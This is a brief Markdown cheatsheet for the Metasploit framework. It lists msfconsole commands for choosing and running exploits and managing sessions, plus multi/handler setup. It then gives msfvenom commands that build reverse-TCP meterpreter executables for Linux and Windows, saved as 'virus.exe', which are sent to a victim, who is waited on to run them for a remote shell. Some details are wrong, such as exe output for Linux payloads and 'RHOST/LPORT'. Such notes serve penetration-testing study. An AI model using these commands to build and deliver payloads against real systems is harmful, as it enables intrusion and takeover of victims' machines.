# Metaexploit

## Cheatsheet

`sudo msfconsole` - start metaexploit

Basic commands to exploit:

- `use <name_id_exploit//>`
- `set LHOST/LPORT <ip_addr_attacker>`
- `set RHOST/LPORT <ip_addr_victim>`
- `exploit` or `run`

General commands:
- Search exploits for vuln. - `search <vuln>`
- List all session - `session -l`
- Recover session with ID - `session -i <ID>`

After exploit command: 
- To open shell - `shell`
- To understand what we have - `show options`

Multi/handler
- `use multi/handler`
- `set LHOST <ip_addr_attacker>`
- `set payload <payload>` - the payload is what goes after -p in the creation below: linux/x86/meterpreter/reverse_tcp

In a terminal in attacker we creater the malware file:
- create staged meterpreter Linux - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > virus.exe`
- create inline meterpreter linuz - `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > virus.exe`
- executable with windows - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > shell-meterp.exe`

We send the file to the victim machine

Back to meterpreter
- `run` - we wait for the victim to execute the virus



